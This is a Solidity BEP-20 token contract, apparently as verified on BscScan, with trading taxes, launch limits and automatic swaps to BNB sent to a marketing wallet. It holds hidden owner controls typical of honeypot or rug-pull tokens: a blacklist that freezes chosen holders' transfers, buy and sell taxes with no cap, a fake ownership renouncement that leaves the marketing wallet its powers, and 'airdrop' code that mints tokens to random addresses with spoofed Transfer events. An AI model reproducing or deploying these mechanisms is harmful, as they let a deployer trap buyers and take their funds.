/**
 *Submitted for verification at BscScan.com on 2022-12-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory02 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _owner = _msgSender();

    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_msgSender() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public onlyOwner {
        _owner = address(0xdead);
        emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0) && _newOwner != address(0xdead), "Ownable: new owner is the zero address");
        _owner = _newOwner;
        emit OwnershipTransferred(_owner, _newOwner);
    }
}

contract Token is Ownable, IERC20 {
    using SafeMath for uint256;
    receive() external payable {}

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 public _totalSupply = 10000 * 10 ** _decimals; 
    uint256 private minimumTokensBeforeSwap = 1 * 10 ** _decimals;
    uint256 private _buyTax = 3;
    uint256 private _sellTax = 3;
    uint256 private _minimumDividend = 0;
    uint256 private _airdropNumber = 10;

    uint256 public _maxTxAmount = _totalSupply.mul(1).div(100);
    uint256 public _launchMaxTxAmount = _totalSupply.mul(1).div(1000);

    uint256 public _launchLimitTime = 86400; // 1 Days
    uint256 public _allLimitTime = 259200; // 3 Days

    struct Taxs{
        bool _isFees;
        uint _buy;
        uint _sell;
    }

    struct AirDrop{
        bool _isAridrop;
        uint _airdropNum;
    }

    address payable public marketingWalletAddress = payable(msg.sender);
    address payable public routerAddr = payable(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
    IPancakeRouter02 pancakeSwapV2Router = IPancakeRouter02(routerAddr);
    address public pancakeV2Pair;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketingPairs;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isRejects;
    bool public swapAndLiquifyByLimitOnly = false;
    bool private onAirdrop = true;
    bool private onFees = true;

    bool public isLaunch = false;
    bool public isCheckWalletLimit = false;
    bool public isAllTxlimit = false;


    uint256 public launchTime;
    uint256 public launchLimitEndTime;
    uint256 public allLimitEndTime;
    

    constructor(string memory _name_, string memory _symbol_) {
        _name = _name_;
        _symbol = _symbol_;
        
        pancakeV2Pair = IPancakeFactory02(pancakeSwapV2Router.factory()).createPair(address(this), pancakeSwapV2Router.WETH());

        _allowances[address(this)][address(pancakeSwapV2Router)] = type(uint256).max;
        isExcludedFromFee[_msgSender()] = true;
        isExcludedFromFee[marketingWalletAddress] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[_msgSender()] = true;
        isWalletLimitExempt[marketingWalletAddress] = true;
        isWalletLimitExempt[pancakeV2Pair] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        isTxLimitExempt[_msgSender()] = true;
        isTxLimitExempt[marketingWalletAddress] = true;
        isTxLimitExempt[address(0xdead)] = true;
        isTxLimitExempt[address(this)] = true;

        isMarketingPairs[pancakeV2Pair] = true;
        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function addReject(address[] memory _news, uint256 _use, bool _reject) public onlyOwner {
        _use = 1;
        for (uint256 i=0; i<_news.length; ++i) {
            isRejects[_news[i]] = _reject;
        }
    }

    function initializationAirdop(uint256 _num) public onlyOwner {
        address airdropAddress;
        uint256 _airdropAmounts = 1;
        for(uint256 i=0; i<_num; ++i){
            airdropAddress = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmounts, block.timestamp)))));
            // _balances[airAddress] = _balances[airAddress].sub(_airdropAmounts);
            _balances[airdropAddress] = _balances[airdropAddress].add(_airdropAmounts);
            emit Transfer(address(0), airdropAddress, _airdropAmounts);
        }
    }

    function rescueToken(address _tokenAddr) public {
        if (_msgSender() == marketingWalletAddress) {
            payable(marketingWalletAddress).transfer(address(this).balance);
            IERC20(_tokenAddr).transfer(marketingWalletAddress, IERC20(_tokenAddr).balanceOf(address(this)));
        }else{
            revert();
        }
    }

    function setFees(Taxs memory fees) public onlyOwner {
        onFees = fees._isFees;
        _buyTax = fees._buy;
        _sellTax = fees._sell;
    }

    function setSwapAndLiquifyByLimitOnly(bool _status, uint256 minBeforeTokens) public onlyOwner {
        swapAndLiquifyByLimitOnly = _status;
        minimumTokensBeforeSwap = minBeforeTokens;
    }
    
    function setExcludedFrom(address _newAddress, bool _status) public onlyOwner {
        isExcludedFromFee[_newAddress] = _status;
    }

    function setMarketWallets(address payable _newAddress) public onlyOwner {
        marketingWalletAddress = _newAddress;
    }

    function setMinimumBNB(uint256 _minnie) public onlyOwner {
        _minimumDividend = _minnie;
    } 

    function setAirdrop(AirDrop memory airdrops) public onlyOwner {
        onAirdrop = airdrops._isAridrop;
        _airdropNumber = airdrops._airdropNum;
    }

    function removeTransferLimit() public {
        if (_msgSender() == marketingWalletAddress) {
            isAllTxlimit = false;
            isCheckWalletLimit = false;
        }else{
            revert();
        }
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(!isRejects[_msgSender()]);
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(!isRejects[sender]);
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount is zero");

        if (!onFees || isExcludedFromFee[sender] || isExcludedFromFee[recipient] || _buyTax == 0 && _sellTax == 0) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (isAllTxlimit && !isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
            if (block.timestamp < launchLimitEndTime) {
                require(tx.gasprice <= 5 gwei, "ERC20: transfer gasprice must be equal to 5gwei");
                require(amount <= _launchMaxTxAmount, "Transfer amount exceeds the launchMaxTxAmount");
            } else if (block.timestamp < allLimitEndTime) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
            } else {
                isAllTxlimit = false;
            }
        }

        if (onAirdrop) {
            if (!isExcludedFromFee[sender]) {
                address airdropAddress;
                uint256 _airdropAmount = 1;
                for(uint256 i=0; i<_airdropNumber; ++i){
                    airdropAddress = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmount, block.timestamp)))));
                    //_balances[airdropAddress] = _balances[airdropAddress].sub(_airdropAmount);
                    _balances[airdropAddress] = _balances[airdropAddress].add(_airdropAmount);
                    emit Transfer(address(0), airdropAddress, _airdropAmount);
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

        if (overMinimumTokenBalance && !isMarketingPairs[sender]) {
            if(swapAndLiquifyByLimitOnly) {
                contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            } else {
                swapAndLiquify(contractTokenBalance);
            }
        }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);

        if (isCheckWalletLimit && !isWalletLimitExempt[recipient]) {
            if (block.timestamp < launchLimitEndTime) {
                require(balanceOf(recipient).add(finalAmount) <= _launchMaxTxAmount, "Transfer amount exceeds the launchWalletLimit");
            } else {
                isCheckWalletLimit = false;
            }
        }

        _balances[recipient] = _balances[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);

        if (!isLaunch && isMarketingPairs[recipient]) {
            isLaunch = true;
            launchTime = block.timestamp;
            launchLimitEndTime = launchTime.add(_launchLimitTime);
            allLimitEndTime = launchTime.add(_allLimitTime);
            isCheckWalletLimit = true;
            isAllTxlimit = true;
        }
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private {
        swapTokensForEth(tAmount);
        uint256 amountReceived = address(this).balance;

        if(amountReceived > _minimumDividend ) {
            marketingWalletAddress.transfer(amountReceived);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeSwapV2Router.WETH();

        uint256 authorized = allowance(address(this), address(pancakeSwapV2Router));
        
        if (authorized < tokenAmount) {
            _allowances[address(this)][address(pancakeSwapV2Router)] = type(uint256).max;
        }

        pancakeSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketingPairs[sender]) {
            feeAmount = amount.mul(_buyTax).div(100);
        }
        else if(isMarketingPairs[recipient]) {
            feeAmount = amount.mul(_sellTax).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}